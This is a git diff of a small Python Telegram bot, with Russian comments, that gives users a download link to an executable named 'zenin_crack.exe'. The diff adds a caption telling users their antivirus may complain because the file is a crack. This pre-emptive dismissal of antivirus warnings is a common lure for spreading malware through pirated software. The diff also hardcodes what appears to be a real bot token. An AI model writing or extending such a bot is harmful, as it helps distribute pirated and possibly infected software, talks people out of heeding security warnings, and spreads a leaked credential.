@@ -4,8 +4,9 @@ from flask import Flask
 import telebot
 from telebot import types
 
-TOKEN = "8773898221:AAGy67kpPvmxiHWCMagPdljvKWWX9fxz-FI"  # ЗАМЕНИТЕ НА СВОЙ ТОКЕН
+TOKEN = "8773898221:AAGy67kpPvmxiHWCMagPdljvKWWX9fxz-FI"  # ЗАМЕНИТЕ
 SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/zenin_crack.exe/file"
+IMAGE_URL = "https://i.ibb.co/vxLfXLY4/gg.png"  # ВСТАВЬТЕ ПРЯМУЮ ССЫЛКУ
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
@@ -25,10 +26,12 @@ def callback(call):
         bot.send_message(call.message.chat.id, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")
     
     elif call.data == "more":
-        # Замени ссылку на свою картинку
-        bot.send_photo(call.message.chat.id, "https://i.ibb.co/vxLfXLY4/gg.png", caption="📌 Подробнее о софте")
+        bot.send_photo(
+            call.message.chat.id,
+            IMAGE_URL,
+            caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️"
+        )
 
-# ЭТО ВАЖНО: Flask сервер для Render
 @app.route('/')
 def index():
     return "Bot is running!"
